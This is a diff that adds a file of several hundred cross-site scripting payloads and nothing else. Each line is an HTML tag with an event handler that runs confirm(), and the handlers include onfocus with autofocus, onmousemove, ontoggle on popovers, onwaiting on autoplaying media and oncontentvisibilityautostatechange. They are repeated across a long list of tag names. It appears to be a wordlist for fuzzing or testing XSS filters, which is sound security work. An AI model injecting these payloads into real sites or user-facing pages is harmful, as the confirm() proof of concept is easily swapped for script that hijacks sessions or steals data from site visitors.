@@ -1,0 +1,459 @@
+<a onfocus=confirm() autofocus tabindex=1>
+<a onmousemove="confirm()" style=display:block>test</a>
+<a2 onfocus=confirm() autofocus tabindex=1>
+<a2 onmousemove="confirm()" style=display:block>test</a2>
+<abbr onfocus=confirm() autofocus tabindex=1>
+<abbr onmousemove="confirm()" style=display:block>test</abbr>
+<acronym onfocus=confirm() autofocus tabindex=1>
+<acronym onmousemove="confirm()" style=display:block>test</acronym>
+<address onfocus=confirm() autofocus tabindex=1>
+<address onmousemove="confirm()" style=display:block>test</address>
+<animate onfocus=confirm() autofocus tabindex=1>
+<animate onmousemove="confirm()" style=display:block>test</animate>
+<animatemotion onfocus=confirm() autofocus tabindex=1>
+<animatemotion onmousemove="confirm()" style=display:block>test</animatemotion>
+<animatetransform onfocus=confirm() autofocus tabindex=1>
+<animatetransform onmousemove="confirm()" style=display:block>test</animatetransform>
+<applet onfocus=confirm() autofocus tabindex=1>
+<applet onmousemove="confirm()" style=display:block>test</applet>
+<area onfocus=confirm() autofocus tabindex=1>
+<area onmousemove="confirm()" style=display:block>test</area>
+<article onfocus=confirm() autofocus tabindex=1>
+<article onmousemove="confirm()" style=display:block>test</article>
+<aside onfocus=confirm() autofocus tabindex=1>
+<aside onmousemove="confirm()" style=display:block>test</aside>
+<audio controls loop muted autoplay onwaiting=confirm()><source src=validaudio.mp3 type=audio/mpeg></audio>
+<audio onfocus=confirm() autofocus tabindex=1>
+<audio onmousemove="confirm()" style=display:block>test</audio>
+<audio2 onfocus=confirm() autofocus tabindex=1>
+<audio2 onmousemove="confirm()" style=display:block>test</audio2>
+<b onfocus=confirm() autofocus tabindex=1>
+<b onmousemove="confirm()" style=display:block>test</b>
+<bdi onfocus=confirm() autofocus tabindex=1>
+<bdi onmousemove="confirm()" style=display:block>test</bdi>
+<bdo onfocus=confirm() autofocus tabindex=1>
+<bdo onmousemove="confirm()" style=display:block>test</bdo>
+<big onfocus=confirm() autofocus tabindex=1>
+<big onmousemove="confirm()" style=display:block>test</big>
+<blink onfocus=confirm() autofocus tabindex=1>
+<blink onmousemove="confirm()" style=display:block>test</blink>
+<blockquote onfocus=confirm() autofocus tabindex=1>
+<blockquote onmousemove="confirm()" style=display:block>test</blockquote>
+<body onfocus=confirm() autofocus tabindex=1>
+<body onmousemove="confirm()" style=display:block>test</body>
+<br onfocus=confirm() autofocus tabindex=1>
+<br onmousemove="confirm()" style=display:block>test</br>
+<button onfocus=confirm() autofocus tabindex=1>
+<button onmousemove="confirm()" style=display:block>test</button>
+<button popovertarget=x>Click me</button><a ontoggle=confirm() popover id=x>XSS</a>
+<button popovertarget=x>Click me</button><a2 ontoggle=confirm() popover id=x>XSS</a2>
+<button popovertarget=x>Click me</button><abbr ontoggle=confirm() popover id=x>XSS</abbr>
+<button popovertarget=x>Click me</button><acronym ontoggle=confirm() popover id=x>XSS</acronym>
+<button popovertarget=x>Click me</button><address ontoggle=confirm() popover id=x>XSS</address>
+<button popovertarget=x>Click me</button><animate ontoggle=confirm() popover id=x>XSS</animate>
+<button popovertarget=x>Click me</button><animatemotion ontoggle=confirm() popover id=x>XSS</animatemotion>
+<button popovertarget=x>Click me</button><animatetransform ontoggle=confirm() popover id=x>XSS</animatetransform>
+<button popovertarget=x>Click me</button><applet ontoggle=confirm() popover id=x>XSS</applet>
+<button popovertarget=x>Click me</button><area ontoggle=confirm() popover id=x>XSS</area>
+<button popovertarget=x>Click me</button><article ontoggle=confirm() popover id=x>XSS</article>
+<button popovertarget=x>Click me</button><aside ontoggle=confirm() popover id=x>XSS</aside>
+<button popovertarget=x>Click me</button><audio ontoggle=confirm() popover id=x>XSS</audio>
+<button popovertarget=x>Click me</button><audio2 ontoggle=confirm() popover id=x>XSS</audio2>
+<button popovertarget=x>Click me</button><b ontoggle=confirm() popover id=x>XSS</b>
+<button popovertarget=x>Click me</button><bdi ontoggle=confirm() popover id=x>XSS</bdi>
+<button popovertarget=x>Click me</button><bdo ontoggle=confirm() popover id=x>XSS</bdo>
+<button popovertarget=x>Click me</button><big ontoggle=confirm() popover id=x>XSS</big>
+<button popovertarget=x>Click me</button><blink ontoggle=confirm() popover id=x>XSS</blink>
+<button popovertarget=x>Click me</button><blockquote ontoggle=confirm() popover id=x>XSS</blockquote>
+<button popovertarget=x>Click me</button><body ontoggle=confirm() popover id=x>XSS</body>
+<button popovertarget=x>Click me</button><br ontoggle=confirm() popover id=x>XSS</br>
+<button popovertarget=x>Click me</button><button ontoggle=confirm() popover id=x>XSS</button>
+<button popovertarget=x>Click me</button><canvas ontoggle=confirm() popover id=x>XSS</canvas>
+<button popovertarget=x>Click me</button><caption ontoggle=confirm() popover id=x>XSS</caption>
+<button popovertarget=x>Click me</button><center ontoggle=confirm() popover id=x>XSS</center>
+<button popovertarget=x>Click me</button><cite ontoggle=confirm() popover id=x>XSS</cite>
+<button popovertarget=x>Click me</button><code ontoggle=confirm() popover id=x>XSS</code>
+<button popovertarget=x>Click me</button><col ontoggle=confirm() popover id=x>XSS</col>
+<button popovertarget=x>Click me</button><colgroup ontoggle=confirm() popover id=x>XSS</colgroup>
+<button popovertarget=x>Click me</button><command ontoggle=confirm() popover id=x>XSS</command>
+<button popovertarget=x>Click me</button><content ontoggle=confirm() popover id=x>XSS</content>
+<button popovertarget=x>Click me</button><custom tags ontoggle=confirm() popover id=x>XSS</custom tags>
+<button popovertarget=x>Click me</button><data ontoggle=confirm() popover id=x>XSS</data>
+<button popovertarget=x>Click me</button><datalist ontoggle=confirm() popover id=x>XSS</datalist>
+<button popovertarget=x>Click me</button><dd ontoggle=confirm() popover id=x>XSS</dd>
+<button popovertarget=x>Click me</button><del ontoggle=confirm() popover id=x>XSS</del>
+<button popovertarget=x>Click me</button><details ontoggle=confirm() popover id=x>XSS</details>
+<button popovertarget=x>Click me</button><dfn ontoggle=confirm() popover id=x>XSS</dfn>
+<button popovertarget=x>Click me</button><dialog ontoggle=confirm() popover id=x>XSS</dialog>
+<button popovertarget=x>Click me</button><dir ontoggle=confirm() popover id=x>XSS</dir>
+<button popovertarget=x>Click me</button><div ontoggle=confirm() popover id=x>XSS</div>
+<button popovertarget=x>Click me</button><dl ontoggle=confirm() popover id=x>XSS</dl>
+<button popovertarget=x>Click me</button><dt ontoggle=confirm() popover id=x>XSS</dt>
+<button popovertarget=x>Click me</button><element ontoggle=confirm() popover id=x>XSS</element>
+<button popovertarget=x>Click me</button><em ontoggle=confirm() popover id=x>XSS</em>
+<button popovertarget=x>Click me</button><embed ontoggle=confirm() popover id=x>XSS</embed>
+<button popovertarget=x>Click me</button><fieldset ontoggle=confirm() popover id=x>XSS</fieldset>
+<button popovertarget=x>Click me</button><figcaption ontoggle=confirm() popover id=x>XSS</figcaption>
+<button popovertarget=x>Click me</button><figure ontoggle=confirm() popover id=x>XSS</figure>
+<button popovertarget=x>Click me</button><font ontoggle=confirm() popover id=x>XSS</font>
+<button popovertarget=x>Click me</button><footer ontoggle=confirm() popover id=x>XSS</footer>
+<button popovertarget=x>Click me</button><form ontoggle=confirm() popover id=x>XSS</form>
+<button popovertarget=x>Click me</button><frame ontoggle=confirm() popover id=x>XSS</frame>
+<button popovertarget=x>Click me</button><frameset ontoggle=confirm() popover id=x>XSS</frameset>
+<button popovertarget=x>Click me</button><h1 ontoggle=confirm() popover id=x>XSS</h1>
+<button popovertarget=x>Click me</button><head ontoggle=confirm() popover id=x>XSS</head>
+<button popovertarget=x>Click me</button><header ontoggle=confirm() popover id=x>XSS</header>
+<button popovertarget=x>Click me</button><hgroup ontoggle=confirm() popover id=x>XSS</hgroup>
+<button popovertarget=x>Click me</button><hr ontoggle=confirm() popover id=x>XSS</hr>
+<button popovertarget=x>Click me</button><html ontoggle=confirm() popover id=x>XSS</html>
+<button popovertarget=x>Click me</button><i ontoggle=confirm() popover id=x>XSS</i>
+<button popovertarget=x>Click me</button><iframe ontoggle=confirm() popover id=x>XSS</iframe>
+<button popovertarget=x>Click me</button><iframe2 ontoggle=confirm() popover id=x>XSS</iframe2>
+<button popovertarget=x>Click me</button><image ontoggle=confirm() popover id=x>XSS</image>
+<button popovertarget=x>Click me</button><image2 ontoggle=confirm() popover id=x>XSS</image2>
+<button popovertarget=x>Click me</button><image3 ontoggle=confirm() popover id=x>XSS</image3>
+<button popovertarget=x>Click me</button><img ontoggle=confirm() popover id=x>XSS</img>
+<button popovertarget=x>Click me</button><img2 ontoggle=confirm() popover id=x>XSS</img2>
+<button popovertarget=x>Click me</button><input ontoggle=confirm() popover id=x>XSS</input>
+<button popovertarget=x>Click me</button><input2 ontoggle=confirm() popover id=x>XSS</input2>
+<button popovertarget=x>Click me</button><input3 ontoggle=confirm() popover id=x>XSS</input3>
+<button popovertarget=x>Click me</button><input4 ontoggle=confirm() popover id=x>XSS</input4>
+<button popovertarget=x>Click me</button><ins ontoggle=confirm() popover id=x>XSS</ins>
+<button popovertarget=x>Click me</button><kbd ontoggle=confirm() popover id=x>XSS</kbd>
+<button popovertarget=x>Click me</button><keygen ontoggle=confirm() popover id=x>XSS</keygen>
+<button popovertarget=x>Click me</button><label ontoggle=confirm() popover id=x>XSS</label>
+<button popovertarget=x>Click me</button><legend ontoggle=confirm() popover id=x>XSS</legend>
+<button popovertarget=x>Click me</button><li ontoggle=confirm() popover id=x>XSS</li>
+<button popovertarget=x>Click me</button><link ontoggle=confirm() popover id=x>XSS</link>
+<button popovertarget=x>Click me</button><listing ontoggle=confirm() popover id=x>XSS</listing>
+<button popovertarget=x>Click me</button><main ontoggle=confirm() popover id=x>XSS</main>
+<button popovertarget=x>Click me</button><map ontoggle=confirm() popover id=x>XSS</map>
+<button popovertarget=x>Click me</button><mark ontoggle=confirm() popover id=x>XSS</mark>
+<button popovertarget=x>Click me</button><marquee ontoggle=confirm() popover id=x>XSS</marquee>
+<button popovertarget=x>Click me</button><menu ontoggle=confirm() popover id=x>XSS</menu>
+<button popovertarget=x>Click me</button><menuitem ontoggle=confirm() popover id=x>XSS</menuitem>
+<button popovertarget=x>Click me</button><meta ontoggle=confirm() popover id=x>XSS</meta>
+<button popovertarget=x>Click me</button><meter ontoggle=confirm() popover id=x>XSS</meter>
+<button popovertarget=x>Click me</button><multicol ontoggle=confirm() popover id=x>XSS</multicol>
+<button popovertarget=x>Click me</button><nav ontoggle=confirm() popover id=x>XSS</nav>
+<button popovertarget=x>Click me</button><nextid ontoggle=confirm() popover id=x>XSS</nextid>
+<button popovertarget=x>Click me</button><nobr ontoggle=confirm() popover id=x>XSS</nobr>
+<button popovertarget=x>Click me</button><noembed ontoggle=confirm() popover id=x>XSS</noembed>
+<button popovertarget=x>Click me</button><noframes ontoggle=confirm() popover id=x>XSS</noframes>
+<button popovertarget=x>Click me</button><noscript ontoggle=confirm() popover id=x>XSS</noscript>
+<button popovertarget=x>Click me</button><object ontoggle=confirm() popover id=x>XSS</object>
+<button popovertarget=x>Click me</button><ol ontoggle=confirm() popover id=x>XSS</ol>
+<button popovertarget=x>Click me</button><optgroup ontoggle=confirm() popover id=x>XSS</optgroup>
+<button popovertarget=x>Click me</button><option ontoggle=confirm() popover id=x>XSS</option>
+<button popovertarget=x>Click me</button><output ontoggle=confirm() popover id=x>XSS</output>
+<button popovertarget=x>Click me</button><p ontoggle=confirm() popover id=x>XSS</p>
+<button popovertarget=x>Click me</button><param ontoggle=confirm() popover id=x>XSS</param>
+<button popovertarget=x>Click me</button><picture ontoggle=confirm() popover id=x>XSS</picture>
+<button popovertarget=x>Click me</button><plaintext ontoggle=confirm() popover id=x>XSS</plaintext>
+<button popovertarget=x>Click me</button><pre ontoggle=confirm() popover id=x>XSS</pre>
+<button popovertarget=x>Click me</button><progress ontoggle=confirm() popover id=x>XSS</progress>
+<button popovertarget=x>Click me</button><q ontoggle=confirm() popover id=x>XSS</q>
+<button popovertarget=x>Click me</button><rb ontoggle=confirm() popover id=x>XSS</rb>
+<button popovertarget=x>Click me</button><rp ontoggle=confirm() popover id=x>XSS</rp>
+<button popovertarget=x>Click me</button><rt ontoggle=confirm() popover id=x>XSS</rt>
+<button popovertarget=x>Click me</button><rtc ontoggle=confirm() popover id=x>XSS</rtc>
+<button popovertarget=x>Click me</button><ruby ontoggle=confirm() popover id=x>XSS</ruby>
+<button popovertarget=x>Click me</button><s ontoggle=confirm() popover id=x>XSS</s>
+<button popovertarget=x>Click me</button><samp ontoggle=confirm() popover id=x>XSS</samp>
+<button popovertarget=x>Click me</button><script ontoggle=confirm() popover id=x>XSS</script>
+<button popovertarget=x>Click me</button><section ontoggle=confirm() popover id=x>XSS</section>
+<button popovertarget=x>Click me</button><select ontoggle=confirm() popover id=x>XSS</select>
+<button popovertarget=x>Click me</button><set ontoggle=confirm() popover id=x>XSS</set>
+<button popovertarget=x>Click me</button><shadow ontoggle=confirm() popover id=x>XSS</shadow>
+<button popovertarget=x>Click me</button><slot ontoggle=confirm() popover id=x>XSS</slot>
+<button popovertarget=x>Click me</button><small ontoggle=confirm() popover id=x>XSS</small>
+<button popovertarget=x>Click me</button><source ontoggle=confirm() popover id=x>XSS</source>
+<button popovertarget=x>Click me</button><spacer ontoggle=confirm() popover id=x>XSS</spacer>
+<button popovertarget=x>Click me</button><span ontoggle=confirm() popover id=x>XSS</span>
+<button popovertarget=x>Click me</button><strike ontoggle=confirm() popover id=x>XSS</strike>
+<button popovertarget=x>Click me</button><strong ontoggle=confirm() popover id=x>XSS</strong>
+<button popovertarget=x>Click me</button><style ontoggle=confirm() popover id=x>XSS</style>
+<button popovertarget=x>Click me</button><sub ontoggle=confirm() popover id=x>XSS</sub>
+<button popovertarget=x>Click me</button><summary ontoggle=confirm() popover id=x>XSS</summary>
+<button popovertarget=x>Click me</button><sup ontoggle=confirm() popover id=x>XSS</sup>
+<button popovertarget=x>Click me</button><svg ontoggle=confirm() popover id=x>XSS</svg>
+<button popovertarget=x>Click me</button><table ontoggle=confirm() popover id=x>XSS</table>
+<button popovertarget=x>Click me</button><tbody ontoggle=confirm() popover id=x>XSS</tbody>
+<button popovertarget=x>Click me</button><td ontoggle=confirm() popover id=x>XSS</td>
+<button popovertarget=x>Click me</button><template ontoggle=confirm() popover id=x>XSS</template>
+<button popovertarget=x>Click me</button><textarea ontoggle=confirm() popover id=x>XSS</textarea>
+<button popovertarget=x>Click me</button><tfoot ontoggle=confirm() popover id=x>XSS</tfoot>
+<button popovertarget=x>Click me</button><th ontoggle=confirm() popover id=x>XSS</th>
+<button popovertarget=x>Click me</button><thead ontoggle=confirm() popover id=x>XSS</thead>
+<button popovertarget=x>Click me</button><time ontoggle=confirm() popover id=x>XSS</time>
+<button popovertarget=x>Click me</button><title ontoggle=confirm() popover id=x>XSS</title>
+<button popovertarget=x>Click me</button><tr ontoggle=confirm() popover id=x>XSS</tr>
+<button popovertarget=x>Click me</button><track ontoggle=confirm() popover id=x>XSS</track>
+<button popovertarget=x>Click me</button><tt ontoggle=confirm() popover id=x>XSS</tt>
+<button popovertarget=x>Click me</button><u ontoggle=confirm() popover id=x>XSS</u>
+<button popovertarget=x>Click me</button><ul ontoggle=confirm() popover id=x>XSS</ul>
+<button popovertarget=x>Click me</button><var ontoggle=confirm() popover id=x>XSS</var>
+<button popovertarget=x>Click me</button><video ontoggle=confirm() popover id=x>XSS</video>
+<button popovertarget=x>Click me</button><video2 ontoggle=confirm() popover id=x>XSS</video2>
+<button popovertarget=x>Click me</button><wbr ontoggle=confirm() popover id=x>XSS</wbr>
+<button popovertarget=x>Click me</button><xmp ontoggle=confirm() popover id=x>XSS</xmp>
+<canvas onfocus=confirm() autofocus tabindex=1>
+<canvas onmousemove="confirm()" style=display:block>test</canvas>
+<caption onfocus=confirm() autofocus tabindex=1>
+<caption onmousemove="confirm()" style=display:block>test</caption>
+<center onfocus=confirm() autofocus tabindex=1>
+<center onmousemove="confirm()" style=display:block>test</center>
+<cite onfocus=confirm() autofocus tabindex=1>
+<cite onmousemove="confirm()" style=display:block>test</cite>
+<code onfocus=confirm() autofocus tabindex=1>
+<code onmousemove="confirm()" style=display:block>test</code>
+<col onfocus=confirm() autofocus tabindex=1>
+<col onmousemove="confirm()" style=display:block>test</col>
+<colgroup onfocus=confirm() autofocus tabindex=1>
+<colgroup onmousemove="confirm()" style=display:block>test</colgroup>
+<command onfocus=confirm() autofocus tabindex=1>
+<command onmousemove="confirm()" style=display:block>test</command>
+<content onfocus=confirm() autofocus tabindex=1>
+<content onmousemove="confirm()" style=display:block>test</content>
+<custom tags onfocus=confirm() autofocus tabindex=1>
+<custom tags onmousemove="confirm()" style=display:block>test</custom tags>
+<data onfocus=confirm() autofocus tabindex=1>
+<data onmousemove="confirm()" style=display:block>test</data>
+<datalist onfocus=confirm() autofocus tabindex=1>
+<datalist onmousemove="confirm()" style=display:block>test</datalist>
+<dd onfocus=confirm() autofocus tabindex=1>
+<dd onmousemove="confirm()" style=display:block>test</dd>
+<del onfocus=confirm() autofocus tabindex=1>
+<del onmousemove="confirm()" style=display:block>test</del>
+<details onfocus=confirm() autofocus tabindex=1>
+<details onmousemove="confirm()" style=display:block>test</details>
+<dfn onfocus=confirm() autofocus tabindex=1>
+<dfn onmousemove="confirm()" style=display:block>test</dfn>
+<dialog onfocus=confirm() autofocus tabindex=1>
+<dialog onmousemove="confirm()" style=display:block>test</dialog>
+<dir onfocus=confirm() autofocus tabindex=1>
+<dir onmousemove="confirm()" style=display:block>test</dir>
+<div onfocus=confirm() autofocus tabindex=1>
+<div onmousemove="confirm()" style=display:block>test</div>
+<dl onfocus=confirm() autofocus tabindex=1>
+<dl onmousemove="confirm()" style=display:block>test</dl>
+<dt onfocus=confirm() autofocus tabindex=1>
+<dt onmousemove="confirm()" style=display:block>test</dt>
+<element onfocus=confirm() autofocus tabindex=1>
+<element onmousemove="confirm()" style=display:block>test</element>
+<em onfocus=confirm() autofocus tabindex=1>
+<em onmousemove="confirm()" style=display:block>test</em>
+<embed onfocus=confirm() autofocus tabindex=1>
+<embed onmousemove="confirm()" style=display:block>test</embed>
+<fieldset onfocus=confirm() autofocus tabindex=1>
+<fieldset onmousemove="confirm()" style=display:block>test</fieldset>
+<figcaption onfocus=confirm() autofocus tabindex=1>
+<figcaption onmousemove="confirm()" style=display:block>test</figcaption>
+<figure onfocus=confirm() autofocus tabindex=1>
+<figure onmousemove="confirm()" style=display:block>test</figure>
+<font onfocus=confirm() autofocus tabindex=1>
+<font onmousemove="confirm()" style=display:block>test</font>
+<footer onfocus=confirm() autofocus tabindex=1>
+<footer onmousemove="confirm()" style=display:block>test</footer>
+<form onfocus=confirm() autofocus tabindex=1>
+<form onmousemove="confirm()" style=display:block>test</form>
+<frame onfocus=confirm() autofocus tabindex=1>
+<frame onmousemove="confirm()" style=display:block>test</frame>
+<frameset onfocus=confirm() autofocus tabindex=1>
+<frameset onmousemove="confirm()" style=display:block>test</frameset>
+<h1 onfocus=confirm() autofocus tabindex=1>
+<h1 onmousemove="confirm()" style=display:block>test</h1>
+<head onfocus=confirm() autofocus tabindex=1>
+<head onmousemove="confirm()" style=display:block>test</head>
+<header onfocus=confirm() autofocus tabindex=1>
+<header onmousemove="confirm()" style=display:block>test</header>
+<hgroup onfocus=confirm() autofocus tabindex=1>
+<hgroup onmousemove="confirm()" style=display:block>test</hgroup>
+<hr onfocus=confirm() autofocus tabindex=1>
+<hr onmousemove="confirm()" style=display:block>test</hr>
+<html onfocus=confirm() autofocus tabindex=1>
+<html onmousemove="confirm()" style=display:block>test</html>
+<i onfocus=confirm() autofocus tabindex=1>
+<i onmousemove="confirm()" style=display:block>test</i>
+<iframe onfocus=confirm() autofocus tabindex=1>
+<iframe onmousemove="confirm()" style=display:block>test</iframe>
+<iframe2 onfocus=confirm() autofocus tabindex=1>
+<iframe2 onmousemove="confirm()" style=display:block>test</iframe2>
+<image onfocus=confirm() autofocus tabindex=1>
+<image onmousemove="confirm()" style=display:block>test</image>
+<image2 onfocus=confirm() autofocus tabindex=1>
+<image2 onmousemove="confirm()" style=display:block>test</image2>
+<image3 onfocus=confirm() autofocus tabindex=1>
+<image3 onmousemove="confirm()" style=display:block>test</image3>
+<img onfocus=confirm() autofocus tabindex=1>
+<img onmousemove="confirm()" style=display:block>test</img>
+<img2 onfocus=confirm() autofocus tabindex=1>
+<img2 onmousemove="confirm()" style=display:block>test</img2>
+<input onfocus=confirm() autofocus tabindex=1>
+<input onmousemove="confirm()" style=display:block>test</input>
+<input type=hidden oncontentvisibilityautostatechange=confirm() style=content-visibility:auto>
+<input2 onfocus=confirm() autofocus tabindex=1>
+<input2 onmousemove="confirm()" style=display:block>test</input2>
+<input3 onfocus=confirm() autofocus tabindex=1>
+<input3 onmousemove="confirm()" style=display:block>test</input3>
+<input4 onfocus=confirm() autofocus tabindex=1>
+<input4 onmousemove="confirm()" style=display:block>test</input4>
+<ins onfocus=confirm() autofocus tabindex=1>
+<ins onmousemove="confirm()" style=display:block>test</ins>
+<kbd onfocus=confirm() autofocus tabindex=1>
+<kbd onmousemove="confirm()" style=display:block>test</kbd>
+<keygen onfocus=confirm() autofocus tabindex=1>
+<keygen onmousemove="confirm()" style=display:block>test</keygen>
+<label onfocus=confirm() autofocus tabindex=1>
+<label onmousemove="confirm()" style=display:block>test</label>
+<legend onfocus=confirm() autofocus tabindex=1>
+<legend onmousemove="confirm()" style=display:block>test</legend>
+<li onfocus=confirm() autofocus tabindex=1>
+<li onmousemove="confirm()" style=display:block>test</li>
+<link onfocus=confirm() autofocus tabindex=1>
+<link onmousemove="confirm()" style=display:block>test</link>
+<listing onfocus=confirm() autofocus tabindex=1>
+<listing onmousemove="confirm()" style=display:block>test</listing>
+<main onfocus=confirm() autofocus tabindex=1>
+<main onmousemove="confirm()" style=display:block>test</main>
+<map onfocus=confirm() autofocus tabindex=1>
+<map onmousemove="confirm()" style=display:block>test</map>
+<mark onfocus=confirm() autofocus tabindex=1>
+<mark onmousemove="confirm()" style=display:block>test</mark>
+<marquee onfocus=confirm() autofocus tabindex=1>
+<marquee onmousemove="confirm()" style=display:block>test</marquee>
+<menu onfocus=confirm() autofocus tabindex=1>
+<menu onmousemove="confirm()" style=display:block>test</menu>
+<menuitem onfocus=confirm() autofocus tabindex=1>
+<menuitem onmousemove="confirm()" style=display:block>test</menuitem>
+<meta onfocus=confirm() autofocus tabindex=1>
+<meta onmousemove="confirm()" style=display:block>test</meta>
+<meter onfocus=confirm() autofocus tabindex=1>
+<meter onmousemove="confirm()" style=display:block>test</meter>
+<multicol onfocus=confirm() autofocus tabindex=1>
+<multicol onmousemove="confirm()" style=display:block>test</multicol>
+<nav onfocus=confirm() autofocus tabindex=1>
+<nav onmousemove="confirm()" style=display:block>test</nav>
+<nextid onfocus=confirm() autofocus tabindex=1>
+<nextid onmousemove="confirm()" style=display:block>test</nextid>
+<nobr onfocus=confirm() autofocus tabindex=1>
+<nobr onmousemove="confirm()" style=display:block>test</nobr>
+<noembed onfocus=confirm() autofocus tabindex=1>
+<noembed onmousemove="confirm()" style=display:block>test</noembed>
+<noframes onfocus=confirm() autofocus tabindex=1>
+<noframes onmousemove="confirm()" style=display:block>test</noframes>
+<noscript onfocus=confirm() autofocus tabindex=1>
+<noscript onmousemove="confirm()" style=display:block>test</noscript>
+<object onfocus=confirm() autofocus tabindex=1>
+<object onmousemove="confirm()" style=display:block>test</object>
+<ol onfocus=confirm() autofocus tabindex=1>
+<ol onmousemove="confirm()" style=display:block>test</ol>
+<optgroup onfocus=confirm() autofocus tabindex=1>
+<optgroup onmousemove="confirm()" style=display:block>test</optgroup>
+<option onfocus=confirm() autofocus tabindex=1>
+<option onmousemove="confirm()" style=display:block>test</option>
+<output onfocus=confirm() autofocus tabindex=1>
+<output onmousemove="confirm()" style=display:block>test</output>
+<p onfocus=confirm() autofocus tabindex=1>
+<p onmousemove="confirm()" style=display:block>test</p>
+<param onfocus=confirm() autofocus tabindex=1>
+<param onmousemove="confirm()" style=display:block>test</param>
+<picture onfocus=confirm() autofocus tabindex=1>
+<picture onmousemove="confirm()" style=display:block>test</picture>
+<plaintext onfocus=confirm() autofocus tabindex=1>
+<plaintext onmousemove="confirm()" style=display:block>test</plaintext>
+<pre onfocus=confirm() autofocus tabindex=1>
+<pre onmousemove="confirm()" style=display:block>test</pre>
+<progress onfocus=confirm() autofocus tabindex=1>
+<progress onmousemove="confirm()" style=display:block>test</progress>
+<q onfocus=confirm() autofocus tabindex=1>
+<q onmousemove="confirm()" style=display:block>test</q>
+<rb onfocus=confirm() autofocus tabindex=1>
+<rb onmousemove="confirm()" style=display:block>test</rb>
+<rp onfocus=confirm() autofocus tabindex=1>
+<rp onmousemove="confirm()" style=display:block>test</rp>
+<rt onfocus=confirm() autofocus tabindex=1>
+<rt onmousemove="confirm()" style=display:block>test</rt>
+<rtc onfocus=confirm() autofocus tabindex=1>
+<rtc onmousemove="confirm()" style=display:block>test</rtc>
+<ruby onfocus=confirm() autofocus tabindex=1>
+<ruby onmousemove="confirm()" style=display:block>test</ruby>
+<s onfocus=confirm() autofocus tabindex=1>
+<s onmousemove="confirm()" style=display:block>test</s>
+<samp onfocus=confirm() autofocus tabindex=1>
+<samp onmousemove="confirm()" style=display:block>test</samp>
+<script onfocus=confirm() autofocus tabindex=1>
+<script onmousemove="confirm()" style=display:block>test</script>
+<section onfocus=confirm() autofocus tabindex=1>
+<section onmousemove="confirm()" style=display:block>test</section>
+<select onfocus=confirm() autofocus tabindex=1>
+<select onmousemove="confirm()" style=display:block>test</select>
+<set onfocus=confirm() autofocus tabindex=1>
+<set onmousemove="confirm()" style=display:block>test</set>
+<shadow onfocus=confirm() autofocus tabindex=1>
+<shadow onmousemove="confirm()" style=display:block>test</shadow>
+<slot onfocus=confirm() autofocus tabindex=1>
+<slot onmousemove="confirm()" style=display:block>test</slot>
+<small onfocus=confirm() autofocus tabindex=1>
+<small onmousemove="confirm()" style=display:block>test</small>
+<source onfocus=confirm() autofocus tabindex=1>
+<source onmousemove="confirm()" style=display:block>test</source>
+<spacer onfocus=confirm() autofocus tabindex=1>
+<spacer onmousemove="confirm()" style=display:block>test</spacer>
+<span onfocus=confirm() autofocus tabindex=1>
+<span onmousemove="confirm()" style=display:block>test</span>
+<strike onfocus=confirm() autofocus tabindex=1>
+<strike onmousemove="confirm()" style=display:block>test</strike>
+<strong onfocus=confirm() autofocus tabindex=1>
+<strong onmousemove="confirm()" style=display:block>test</strong>
+<style onfocus=confirm() autofocus tabindex=1>
+<style onmousemove="confirm()" style=display:block>test</style>
+<sub onfocus=confirm() autofocus tabindex=1>
+<sub onmousemove="confirm()" style=display:block>test</sub>
+<summary onfocus=confirm() autofocus tabindex=1>
+<summary onmousemove="confirm()" style=display:block>test</summary>
+<sup onfocus=confirm() autofocus tabindex=1>
+<sup onmousemove="confirm()" style=display:block>test</sup>
+<svg onfocus=confirm() autofocus tabindex=1>
+<svg onmousemove="confirm()" style=display:block>test</svg>
+<table onfocus=confirm() autofocus tabindex=1>
+<table onmousemove="confirm()" style=display:block>test</table>
+<tbody onfocus=confirm() autofocus tabindex=1>
+<tbody onmousemove="confirm()" style=display:block>test</tbody>
+<td onfocus=confirm() autofocus tabindex=1>
+<td onmousemove="confirm()" style=display:block>test</td>
+<template onfocus=confirm() autofocus tabindex=1>
+<template onmousemove="confirm()" style=display:block>test</template>
+<textarea onfocus=confirm() autofocus tabindex=1>
+<textarea onmousemove="confirm()" style=display:block>test</textarea>
+<tfoot onfocus=confirm() autofocus tabindex=1>
+<tfoot onmousemove="confirm()" style=display:block>test</tfoot>
+<th onfocus=confirm() autofocus tabindex=1>
+<th onmousemove="confirm()" style=display:block>test</th>
+<thead onfocus=confirm() autofocus tabindex=1>
+<thead onmousemove="confirm()" style=display:block>test</thead>
+<time onfocus=confirm() autofocus tabindex=1>
+<time onmousemove="confirm()" style=display:block>test</time>
+<title onfocus=confirm() autofocus tabindex=1>
+<title onmousemove="confirm()" style=display:block>test</title>
+<tr onfocus=confirm() autofocus tabindex=1>
+<tr onmousemove="confirm()" style=display:block>test</tr>
+<track onfocus=confirm() autofocus tabindex=1>
+<track onmousemove="confirm()" style=display:block>test</track>
+<tt onfocus=confirm() autofocus tabindex=1>
+<tt onmousemove="confirm()" style=display:block>test</tt>
+<u onfocus=confirm() autofocus tabindex=1>
+<u onmousemove="confirm()" style=display:block>test</u>
+<ul onfocus=confirm() autofocus tabindex=1>
+<ul onmousemove="confirm()" style=display:block>test</ul>
+<var onfocus=confirm() autofocus tabindex=1>
+<var onmousemove="confirm()" style=display:block>test</var>
+<video controls loop muted autoplay onwaiting=confirm()><source src=validvideo.mp4 type=video/mp4></video>
+<video onfocus=confirm() autofocus tabindex=1>
+<video onmousemove="confirm()" style=display:block>test</video>
+<video2 onfocus=confirm() autofocus tabindex=1>
+<video2 onmousemove="confirm()" style=display:block>test</video2>
+<wbr onfocus=confirm() autofocus tabindex=1>
+<wbr onmousemove="confirm()" style=display:block>test</wbr>
+<xmp onfocus=confirm() autofocus tabindex=1>
+<xmp onmousemove="confirm()" style=display:block>test</xmp>
